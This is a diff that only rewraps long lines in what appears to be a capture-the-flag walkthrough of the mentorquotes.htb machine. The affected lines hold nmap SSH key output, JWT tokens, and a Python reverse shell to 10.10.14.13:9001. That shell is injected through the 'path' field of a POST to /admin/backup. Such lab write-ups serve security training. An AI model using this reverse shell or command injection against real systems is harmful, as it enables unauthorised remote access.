@@ -46,7 +46,8 @@ PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+
+|                   wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=
 |   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv
 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
@@ -141,7 +142,8 @@ We need JWT authentication. Let's test the registration and login functionality:
 We can get a JWT token by signing up and logging in:
 
 ```
-Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQ1NiIsImVtYWlsIjoiMTIzNEBleGFtcGxlLmNvbSJ9.2VA3k2okByNuNtJ0vfrpgzdVCbN5N4aV_0d1vdGg5vM
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQ1NiIsImVtYWlsIjoi\
+MTIzNEBleGFtcGxlLmNvbSJ9.2VA3k2okByNuNtJ0vfrpgzdVCbN5N4aV_0d1vdGg5vM
 ```
 
 ### API Fuzzing
@@ -224,7 +226,8 @@ First, let's get a session ID for the `james` user:
 
 With a valid JWT token:
 ```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0Bt\
+ZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
 ```
 
 Now we can access the admin endpoints:
@@ -242,20 +245,27 @@ Now we can access the admin endpoints:
 The backup endpoint appears vulnerable to command injection. Let's prepare a reverse shell payload:
 
 ```bash
-export RHOST="10.10.14.13";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+export RHOST="10.10.14.13";export RPORT=9001;python -c 'import sys,socket,os,pty;\
+s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
 
 For use in JSON, we need to escape it:
 
 ```bash
-export RHOST=\"10.10.14.13\";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'
+export RHOST=\"10.10.14.13\";export RPORT=9001;python -c 'import sys,socket,os,pty;\
+s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));\
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'
 ```
 
 **Sample Request:**
 
 ```json
 {
-    "path":"/etc/passwd;export RHOST=\"10.10.14.13\";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
+    "path":"/etc/passwd;export RHOST=\"10.10.14.13\";export RPORT=9001;\
+python -c 'import sys,socket,os,pty;s=socket.socket();\
+s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));\
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
 }
 ```
 
@@ -272,7 +282,8 @@ Since the server has limited workers, we need to use nohup to avoid hanging:
 ```http
 POST /admin/backup HTTP/1.1
 Host: api.mentorquotes.htb
-Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhbGciOiJIUzI1NiJ9ImphbWVzIiwIjZW1haWwiOiJjaGVyb0BjbHViLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4KTI3NTkyMn0.pe6pmshcfF66bimHkTYBX0Hmj5m87Sk5kcjwWb0--Na0
+Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwi\
+ZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
 Content-Type: application/json
 
 {
